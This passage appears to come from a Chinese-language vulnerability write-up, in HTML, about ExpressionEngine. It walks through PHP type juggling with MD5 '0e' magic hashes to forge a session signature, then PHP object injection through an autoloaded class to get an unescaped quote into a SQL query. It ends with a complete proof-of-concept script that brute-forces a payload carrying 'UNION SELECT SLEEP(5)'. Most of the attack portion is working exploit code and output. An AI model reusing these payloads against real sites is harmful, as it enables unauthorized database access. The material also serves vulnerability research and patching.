&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$hash&nbsp;=&nbsp;md5($payload.$salt);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$pre&nbsp;=&nbsp;&quot;0e&quot;;
&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(substr($hash,&nbsp;0,&nbsp;2)&nbsp;===&nbsp;$pre)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(is_numeric($hash))&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;&quot;$payload&nbsp;-&nbsp;$hash\n&quot;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
}
function&nbsp;recurse($width,&nbsp;$position,&nbsp;$base_string)
{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;global&nbsp;$charset,&nbsp;$str_length;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;($i&nbsp;=&nbsp;0;&nbsp;$i&nbsp;&lt;&nbsp;$str_length;&nbsp;++$i)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;($position&nbsp;&nbsp;&lt;&nbsp;$width&nbsp;-&nbsp;1)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;recurse($width,&nbsp;$position&nbsp;+&nbsp;1,&nbsp;$base_string&nbsp;.&nbsp;$charset[$i]);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;check($base_string&nbsp;.&nbsp;$charset[$i]);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
}
for&nbsp;($i&nbsp;=&nbsp;1;&nbsp;$i&nbsp;&lt;&nbsp;PASSWORD_MAX_LENGTH&nbsp;+&nbsp;1;&nbsp;++$i)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;&quot;Checking&nbsp;passwords&nbsp;with&nbsp;length:&nbsp;$i\n&quot;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;recurse($i,&nbsp;0,&nbsp;&#39;&#39;);
}
?&gt;</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">生成我们需要的hash值：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">$&nbsp;php&nbsp;poc1.php
Checking&nbsp;passwords&nbsp;with&nbsp;length:&nbsp;1
Checking&nbsp;passwords&nbsp;with&nbsp;length:&nbsp;2
Checking&nbsp;passwords&nbsp;with&nbsp;length:&nbsp;3
Checking&nbsp;passwords&nbsp;with&nbsp;length:&nbsp;4
Checking&nbsp;passwords&nbsp;with&nbsp;length:&nbsp;5
a:2:{s:13:&quot;:new:username&quot;;s:5:&quot;dLc5d&quot;;s:12:&quot;:new:message&quot;;s:7:&quot;taquito&quot;;}&nbsp;-&nbsp;0e553592359278167729317779925758</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">我们将这个值与任意以0e开头并全部以数字结尾的$signature变量进行对比：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">/*&nbsp;php&nbsp;code*/
$a&nbsp;=&nbsp;&quot;0e553592359278167729317779925758&quot;;
$b&nbsp;=&nbsp;&quot;0e222222222222222222222222222222&quot;;
var_dump($a);
var_dump($b);
if&nbsp;($a&nbsp;==&nbsp;$b)&nbsp;{&nbsp;print&nbsp;&quot;a&nbsp;and&nbsp;b&nbsp;are&nbsp;the&nbsp;same\n&quot;;&nbsp;}
else&nbsp;{&nbsp;print&nbsp;&quot;a&nbsp;and&nbsp;b&nbsp;are&nbsp;NOT&nbsp;the&nbsp;same\n&quot;;&nbsp;}
?&gt;
Output:
$&nbsp;php&nbsp;steps.php
string(32)&nbsp;&quot;0e553592359278167729317779925758&quot;
string(32)&nbsp;&quot;0e222222222222222222222222222222&quot;
a&nbsp;and&nbsp;b&nbsp;are&nbsp;the&nbsp;same</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">这样，我们便能成功的控制服务器的返回数据！</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">弱类型+php对象注入=数据库注入？</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">既然能够控制服务器返回数据了，我们来看看将我们自己的任意数据传递到unserialize（）还能做到什么事情。 为了节省自己一些时间，让我们在“./system/ee/legacy/libraries/Session.php”文件中修改一下代码:</span></p><pre class="brush:plain;toolbar:false">if&nbsp;(md5($payload.$this-&gt;sess_crypt_key)&nbsp;==&nbsp;$signature)</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">替换为：</span></p><pre class="brush:plain;toolbar:false">if&nbsp;(1)</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">这样，我们就无需去满足函数的限制条件了！</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">既然我们可以控制序列化数组里面的:new:username =&gt; admin的值，我们再看到“./system/ee/legacy/libraries/Session.php”的内容，并注意以下函数：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">335&nbsp;function&nbsp;check_password_lockout($username&nbsp;=&nbsp;&#39;&#39;)
336&nbsp;{
337&nbsp;&nbsp;&nbsp;if&nbsp;(ee()-&gt;config-&gt;item(&#39;password_lockout&#39;)&nbsp;==&nbsp;&#39;n&#39;&nbsp;OR
338&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ee()-&gt;config-&gt;item(&#39;password_lockout_interval&#39;)&nbsp;==&nbsp;&#39;&#39;)
339&nbsp;&nbsp;&nbsp;{
340&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;FALSE;
341&nbsp;&nbsp;&nbsp;}
342
343&nbsp;&nbsp;&nbsp;$interval&nbsp;=&nbsp;ee()-&gt;config-&gt;item(&#39;password_lockout_interval&#39;)&nbsp;*&nbsp;60;
344
345&nbsp;&nbsp;&nbsp;$lockout&nbsp;=&nbsp;ee()-&gt;db-&gt;select(&quot;COUNT(*)&nbsp;as&nbsp;count&quot;)
346&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&gt;where(&#39;login_date&nbsp;&gt;&nbsp;&#39;,&nbsp;time()&nbsp;-&nbsp;$interval)
347&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&gt;where(&#39;ip_address&#39;,&nbsp;ee()-&gt;input-&gt;ip_address())
348&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&gt;where(&#39;username&#39;,&nbsp;$username)
349&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&gt;get(&#39;password_lockout&#39;);
350
351&nbsp;&nbsp;&nbsp;return&nbsp;($lockout-&gt;row(&#39;count&#39;)&nbsp;&gt;=&nbsp;4)&nbsp;?&nbsp;TRUE&nbsp;:&nbsp;FALSE;
352&nbsp;}</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">这个函数似乎是通过数据库检查用户的存在性和合法性。 $username的值可控，我们应该能够在这里注入我们自己的SQL参数，进而导致SQL注入。 Expression Engine使用数据库驱动类来与数据库交互，但原始数据库语句就像下面这样（我们可以猜得八九不离十）：</span></p><pre class="brush:plain;toolbar:false">SELECT&nbsp;COUNT(*)&nbsp;as&nbsp;count&nbsp;FROM&nbsp;(`exp_password_lockout`)&nbsp;WHERE&nbsp;`login_date`&nbsp;&gt;&nbsp;&#39;$interval&#39;&nbsp;AND&nbsp;`ip_address`&nbsp;=&nbsp;&#39;$ip_address&#39;&nbsp;AND&nbsp;`username`&nbsp;=&nbsp;&#39;$username&#39;;</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">我们将$payload数据修改为：</span></p><pre class="brush:plain;toolbar:false">&nbsp;a:2:{s:13:&quot;:new:username&quot;;s:1:&quot;&#39;&quot;;s:12:&quot;:new:message&quot;;s:7:&quot;taquito&quot;;}</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">并发出请求，希望能够出现“Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ”’ at line“的错误，但是什么也没有发生...</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">绕过数据库类型检查</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">经过一番搜索后，我们在“./system/ee/legacy/database/DB_driver.php”中遇到了以下代码：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">525&nbsp;function&nbsp;escape($str)
526&nbsp;{
527&nbsp;&nbsp;&nbsp;if&nbsp;(is_string($str))
528&nbsp;&nbsp;&nbsp;{
529&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$str&nbsp;=&nbsp;&quot;&#39;&quot;.$this-&gt;escape_str($str).&quot;&#39;&quot;;
530&nbsp;&nbsp;&nbsp;}
531&nbsp;&nbsp;&nbsp;elseif&nbsp;(is_bool($str))
532&nbsp;&nbsp;&nbsp;{
533&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$str&nbsp;=&nbsp;($str&nbsp;===&nbsp;FALSE)&nbsp;?&nbsp;0&nbsp;:&nbsp;1;
534&nbsp;&nbsp;&nbsp;}
535&nbsp;&nbsp;&nbsp;elseif&nbsp;(is_null($str))
536&nbsp;&nbsp;&nbsp;{
537&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$str&nbsp;=&nbsp;&#39;NULL&#39;;
538&nbsp;&nbsp;&nbsp;}
539
540&nbsp;&nbsp;&nbsp;return&nbsp;$str;
541&nbsp;}</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">在第527行，我们看到对我们的值执行“is_string（）”检查，如果它是真的，我们的值被转义。 我们可以通过在函数的开头和结尾放置一个“var_dump”检查变量：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">string(1)&nbsp;&quot;y&quot;
int(1)
int(1)
int(1)
int(0)
int(1)
int(3)
int(0)
int(1)
int(1486399967)
string(11)&nbsp;&quot;192.168.1.5&quot;
string(1)&nbsp;&quot;&#39;&quot;
int(1)
string(3)&nbsp;&quot;&#39;y&#39;&quot;
int(1)
int(1)
int(1)
int(0)
int(1)
int(3)
int(0)
int(1)
int(1486400275)
string(13)&nbsp;&quot;&#39;192.168.1.5&#39;&quot;
string(4)&nbsp;&quot;&#39;\&#39;&#39;&quot;
int(1)</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">果然，我们可以看到我们的“&#39;”的值已经被转义，现在是“\’”。不过我还有个锦囊妙计。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">转义检查只是判断“$str”是一个字符串，一个布尔值或是null; 如果它不匹配任何这些类型，“$str”将不会进行转义。 这意味着如果我们提供一个“对象”，那么我们应该能够绕过函数检查。 但是，这也意味着我们需要找到一个我们可以使用的php对象。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">自动加载器&#39;驰援&#39;</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">通常，当我们想要寻找可以利用unserialize的类时，我们将搜寻魔术方法（如“__wakeup”或“__destruct”），但是有时候应用程序实际上使用自动加载器。 自动加载背后的一般想法是，当一个对象被创建时，PHP会检查它是否知道该类的任何内容，如果没有，它会自动加载它。 对我们来说，这意味着我们不必依赖包含“__wakeup”或“__destruct”方法的类。 我们只需要找到一个我们可控的“__toString”的类，因为程序把$username作为字符串处理。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">我们找到以下文件“./system/ee/EllisLab/ExpressionEngine/Library/Parser/Conditional/Token/Variable.php”：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:php;toolbar:false">&nbsp;1&nbsp;/*&nbsp;php&nbsp;code*/
&nbsp;2
&nbsp;3&nbsp;&nbsp;namespace&nbsp;EllisLab\ExpressionEngine\Library\Parser\Conditional\Token;
&nbsp;4
&nbsp;5&nbsp;&nbsp;class&nbsp;Variable&nbsp;extends&nbsp;Token&nbsp;{
&nbsp;6
&nbsp;7&nbsp;&nbsp;&nbsp;&nbsp;protected&nbsp;$has_value&nbsp;=&nbsp;FALSE;
&nbsp;8
&nbsp;9&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;function&nbsp;__construct($lexeme)
10&nbsp;&nbsp;&nbsp;&nbsp;{
11&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;parent::__construct(&#39;VARIABLE&#39;,&nbsp;$lexeme);
12&nbsp;&nbsp;&nbsp;&nbsp;}
13
14&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;function&nbsp;canEvaluate()
15&nbsp;&nbsp;&nbsp;&nbsp;{
16&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;$this-&gt;has_value;
17&nbsp;&nbsp;&nbsp;&nbsp;}
18
19&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;function&nbsp;setValue($value)
20&nbsp;&nbsp;&nbsp;&nbsp;{
21&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(is_string($value))
22&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
23&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$value&nbsp;=&nbsp;str_replace(
24&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;array(&#39;{&#39;,&nbsp;&#39;}&#39;),
25&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;array(&#39;{&#39;,&nbsp;&#39;}&#39;),
26&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$value
27&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;);
28&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
29
30&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;value&nbsp;=&nbsp;$value;
31&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;has_value&nbsp;=&nbsp;TRUE;
32&nbsp;&nbsp;&nbsp;&nbsp;}
33
34&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;function&nbsp;value()
35&nbsp;&nbsp;&nbsp;&nbsp;{
36&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;in&nbsp;this&nbsp;case&nbsp;the&nbsp;parent&nbsp;assumption&nbsp;is&nbsp;wrong
37&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;our&nbsp;value&nbsp;is&nbsp;definitely&nbsp;*not*&nbsp;the&nbsp;template&nbsp;string
38&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;!&nbsp;$this-&gt;has_value)
39&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
40&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;NULL;
41&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
42
43&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;$this-&gt;value;
44&nbsp;&nbsp;&nbsp;&nbsp;}
45
46&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;function&nbsp;__toString()
47&nbsp;&nbsp;&nbsp;&nbsp;{
48&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;($this-&gt;has_value)
49&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
50&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;var_export($this-&gt;value,&nbsp;TRUE);
51&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
52
53&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;$this-&gt;lexeme;
54&nbsp;&nbsp;&nbsp;&nbsp;}
55&nbsp;&nbsp;}
56
57&nbsp;&nbsp;//&nbsp;EOF</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">这个类看起来非常适合！ 我们可以看到对象使用参数“$lexeme”调用“construct”，然后调用“toString”，将参数“$lexeme”作为字符串返回，完美！。让我们写一个POC为我们创建序列化对象：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:php;toolbar:false">/*&nbsp;php&nbsp;code*/
namespace&nbsp;EllisLab\ExpressionEngine\Library\Parser\Conditional\Token;
class&nbsp;Variable&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;$lexeme&nbsp;=&nbsp;FALSE;
}
$x&nbsp;=&nbsp;new&nbsp;Variable();
$x-&gt;lexeme&nbsp;=&nbsp;&quot;&#39;&quot;;
echo&nbsp;serialize($x).&quot;\n&quot;;
?&gt;
Output:
$&nbsp;php&nbsp;poc.php
O:67:&quot;EllisLab\ExpressionEngine\Library\Parser\Conditional\Token\Variable&quot;:1:{s:6:&quot;lexeme&quot;;s:1:&quot;&#39;&quot;;}</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">经过几个小时的测试，当我们将我们的对象添加到我们的数组中时（注意其中的反斜线）： a:1:{s:13:&quot;:new:username&quot;;O:67:&quot;EllisLab\\\\\ExpressionEngine\\\\\Library\\\\\Parser\\\\\Conditional\\\\\Token\\\\Variable&quot;:1:{s:6:&quot;lexeme&quot;;s:1:&quot;&#39;&quot;;}} 当我们使用上面的payload发出请求后，我们插入到代码中用于调试的“var_dump()”函数显示：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:php;toolbar:false">string(3)&nbsp;&quot;&#39;y&#39;&quot;
int(1)
int(1)
int(1)
int(0)
int(1)
int(3)
int(0)
int(1)
int(1486407246)
string(13)&nbsp;&quot;&#39;192.168.1.5&#39;&quot;
object(EllisLab\ExpressionEngine\Library\Parser\Conditional\Token\Variable)#177&nbsp;(6)&nbsp;{
&nbsp;&nbsp;[&quot;has_value&quot;:protected]=&gt;
&nbsp;&nbsp;bool(false)
&nbsp;&nbsp;[&quot;type&quot;]=&gt;
&nbsp;&nbsp;NULL
&nbsp;&nbsp;[&quot;lexeme&quot;]=&gt;
&nbsp;&nbsp;string(1)&nbsp;&quot;&#39;&quot;
&nbsp;&nbsp;[&quot;context&quot;]=&gt;
&nbsp;&nbsp;NULL
&nbsp;&nbsp;[&quot;lineno&quot;]=&gt;
&nbsp;&nbsp;NULL
&nbsp;&nbsp;[&quot;value&quot;:protected]=&gt;
&nbsp;&nbsp;NULL
}</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">我们生成了一个“对象”而不是一个“字符串”，“lexeme”的值是没有转义的“‘”！接下来我们发现：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">Exception&nbsp;Caught
SQLSTATE[42000]:&nbsp;Syntax&nbsp;error&nbsp;or&nbsp;access&nbsp;violation:&nbsp;1064&nbsp;You&nbsp;have&nbsp;an&nbsp;error&nbsp;in&nbsp;your&nbsp;SQL&nbsp;syntax;&nbsp;check&nbsp;the&nbsp;manual&nbsp;that&nbsp;corresponds&nbsp;to&nbsp;your&nbsp;MySQL&nbsp;server&nbsp;version&nbsp;for&nbsp;the&nbsp;right&nbsp;syntax&nbsp;to&nbsp;use&nbsp;near&nbsp;&#39;&#39;&#39;&nbsp;at&nbsp;line&nbsp;5:
SELECT&nbsp;COUNT(*)&nbsp;as&nbsp;count
FROM&nbsp;(`exp_password_lockout`)
WHERE&nbsp;`login_date`&nbsp;&gt;&nbsp;&nbsp;1486407246
AND&nbsp;`ip_address`&nbsp;=&nbsp;&nbsp;&#39;192.168.1.5&#39;
AND&nbsp;`username`&nbsp;=&nbsp;&nbsp;&#39;
mysqli_connection.php:122</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">我们成功的通过php对象注入完成了sql注入！</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">完整POC</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">最后，我们来创建了一个poc来使得数据库sleep 5秒。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:php;toolbar:false">/*&nbsp;php&nbsp;code*/
set_time_limit(0);
define(&#39;HASH_ALGO&#39;,&nbsp;&#39;md5&#39;);
define(&#39;garbage_MAX_LENGTH&#39;,&nbsp;8);
$charset&nbsp;=&nbsp;&#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#39;;
$str_length&nbsp;=&nbsp;strlen($charset);
function&nbsp;check($garbage)
{
&nbsp;&nbsp;&nbsp;&nbsp;$length&nbsp;=&nbsp;strlen($garbage)&nbsp;+&nbsp;26;
&nbsp;&nbsp;&nbsp;&nbsp;$salt&nbsp;=&nbsp;&quot;033bc11c2170b83b2ffaaff1323834ac40406b79&quot;;
&nbsp;&nbsp;&nbsp;&nbsp;$payload&nbsp;=&nbsp;&#39;a:1:{s:+13:&quot;:new:username&quot;;O:67:&quot;EllisLab\\\ExpressionEngine\\\Library\\\Parser\\\Conditional\\\Token\\\Variable&quot;:1:{s:+6:&quot;lexeme&quot;;s:+&#39;.$length.&#39;:&quot;1&nbsp;UNION&nbsp;SELECT&nbsp;SLEEP(5)&nbsp;#&nbsp;&#39;.$garbage.&#39;&quot;;}}&#39;;
&nbsp;&nbsp;&nbsp;&nbsp;#echo&nbsp;&quot;Testing:&nbsp;&quot;&nbsp;.&nbsp;$payload&nbsp;.&nbsp;&quot;\n&quot;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$hash&nbsp;=&nbsp;md5($payload.$salt);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$pre&nbsp;=&nbsp;&quot;0e&quot;;
&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(substr($hash,&nbsp;0,&nbsp;2)&nbsp;===&nbsp;$pre)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(is_numeric($hash))&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;&quot;$payload&nbsp;-&nbsp;$hash\n&quot;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
}
function&nbsp;recurse($width,&nbsp;$position,&nbsp;$base_string)
{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;global&nbsp;$charset,&nbsp;$str_length;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;($i&nbsp;=&nbsp;0;&nbsp;$i&nbsp;&lt;&nbsp;$str_length;&nbsp;++$i)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;($position&nbsp;&nbsp;&lt;&nbsp;$width&nbsp;-&nbsp;1)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;recurse($width,&nbsp;$position&nbsp;+&nbsp;1,&nbsp;$base_string&nbsp;.&nbsp;$charset[$i]);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;check($base_string&nbsp;.&nbsp;$charset[$i]);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
}
for&nbsp;($i&nbsp;=&nbsp;1;&nbsp;$i&nbsp;&lt;&nbsp;garbage_MAX_LENGTH&nbsp;+&nbsp;1;&nbsp;++$i)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;&quot;Checking&nbsp;garbages&nbsp;with&nbsp;length:&nbsp;$i\n&quot;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;recurse($i,&nbsp;0,&nbsp;&#39;&#39;);
}
?&gt;
Output:
$&nbsp;php&nbsp;poc2.php
